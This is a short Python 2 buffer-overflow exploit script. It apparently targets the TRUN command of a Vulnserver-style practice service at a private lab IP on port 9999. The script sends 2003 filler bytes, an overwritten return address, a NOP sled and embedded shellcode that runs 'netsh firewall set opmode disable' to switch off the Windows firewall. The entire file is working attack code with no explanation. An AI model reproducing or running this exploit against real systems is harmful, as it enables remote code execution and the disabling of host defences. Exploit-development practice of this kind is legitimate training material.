import socket
import struct

print "\nTRUN Command - Disable firewall using System\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    buf =  b""
    buf += "\x31\xd2\x52\x68\x65\x20\x20\x20\x68\x73\x61\x62\x6c\x68\x65\x20\x64\x69\x68\x70\x6d\x6f\x64\x68\x65\x74\x20\x6f\x68\x6c\x6c\x20\x73\x68\x72\x65\x77\x61\x68\x68\x20\x66\x69\x68\x6e\x65\x74\x73\x89\xe3\x53\xba\xc7\x93\xc2\x77\xff\xd2"
    
    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(evil_buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
